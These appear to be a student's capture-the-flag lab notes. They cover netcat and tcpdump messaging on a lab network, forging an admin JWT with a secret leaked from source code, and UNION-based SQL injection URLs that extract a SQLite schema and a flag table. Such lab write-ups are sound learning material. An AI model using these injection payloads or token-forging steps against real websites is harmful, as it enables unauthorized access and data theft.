task1:
- entered the shell
- scanned the network using nmap to determine hosts because of the
  hint of waiting messages
- based on 18u, determined it's correlated with on UDP port 18 so send messages to
  each host:
- echo "hey" | nc -u <ip_address> 18
- one responded: echo "hey" | nc -u 10.128.6.111 18

task2:
- hint on listening of tubes and SYN => tcpdump
- waited (a while), someone tried to communicate with a SYN to shell.13943
- listened on the port, received: Is there anyone here? Hey there, can you hear me?
- based on hint of listening in the background, moved the listen with & and tcdump
- found second port it tried to communicate to: 14232
- got message: You really really see this? Let's just try it one more time...
- ran both port in the background and listened actively on the first one to get
  messages (rinse and repeat hint)
- got the flag on port 13943

task3:
-scanned the network again and found host 10.128.9.149 with opened port 5000
-ran to open the site on local browser ./webtunnel.sh 149 5000
-sending data to login page found using tools a POST to /api/login
-figured on register for registration /api/register would be used
-send a curl request and received message "First name is required"
-sending many curls and adding the requested info, the final curl message is:
curl -X POST http://localhost:8080/api/register -H "Content-Type: application/json" -d '{"firstName" : "test", "lastName": "test", "email": "test@gmail.com", "age": "20", "website": "www.test.com", "username": "test", "password": "Testtesttest10!", "confirmPassword": "Testtesttest10!"}'
- now logged in with credentials: username=test&password=Testtesttest10!
- found the following cookie of JWT type
cookie: accessToken - eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpc0FkbWluIjpmYWxzZSwiZXhwIjoxNzM2MTk0OTQwfQ.o_TDfzbg2sF2oB9p-eNlWPXMF6JE8D02_hrw2e5TqWI
- crashed the site entering chars instead of ints
- saw messages from /api.py => here we go source code
- found secret: Xkyqfz1qee4m9c0StD3HJzXHJm6qqJWx in source code
- used jwt.io to and entered my current cookie, found
{
  "username": "test",
  "isAdmin": false,
  "exp": 1736341254
}
- changed isAdmin to true and gave the secret key in signature
- new cookie: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpc0FkbWluIjp0cnVlLCJleHAiOjE3MzYzNDEyNTR9.rd4L8gH_7RbIOLMALtjZxglcZkhdU7bXLDpRGDWpvqY
- edited the cookie with the new value and a new html page returned
- in the page elements was hidden the flag

task4:
- based on previous nmaps, remembered host 107 with opened port 9090: ./webtunnel 107 9090
- tried sqli in site field without success
- added items to cart, using browser tools found request to /add_to_cart/1
- tried sqli in the link and found an error on sqlite therefore the database
- using PayloadAllThings found format for main table sqli_table
- used the following injection to get all tables (fields were based on cart format):
http://localhost:8080/add_to_cart/1)UNION SELECT name,name,0.0,0.0,0.0 FROM sqlite_master WHERE type='table'--
- nothing happened, deleted cookie and reloaded cart and found the list:
Invisible Socks	$9.99	$14.98	$24.97
employees	$0.0	$0.0	$0.0
flagzIEudie	$0.0	$0.0	$0.0
products	$0.0	$0.0	$0.0
sqlite_sequence	$0.0	$0.0	$0.0
- based on this, and the PayloadAllThings documentation replaced name with sql, and replaced field type with tbl_name:http://localhost:8080/add_to_cart/1)UNION%20SELECT%20sql,sql,0.0,0.0,0.0%20FROM%20sqlite_master%20WHERE%20tbl_name='flagzIEudie'--
http://localhost:8080/add_to_cart/1)UNION SELECT sql,sql,0.0,0.0,0.0 FROM sqlite_master WHERE tbl_name='flagzIEudie'--
deleted cookie and on cart a *wild* field appeared:
CREATE TABLE flagzIEudie ( id INTEGER PRIMARY KEY AUTOINCREMENT, value1474 TEXT NOT NULL )	$0.0	$0.0	$0.0
replaced sql with value and selected directly from the table:
http://localhost:8080/add_to_cart/1)UNION SELECT value1474,value1474,0.0,0.0,0.0 FROM flagzIEudie--
found in cart the flag
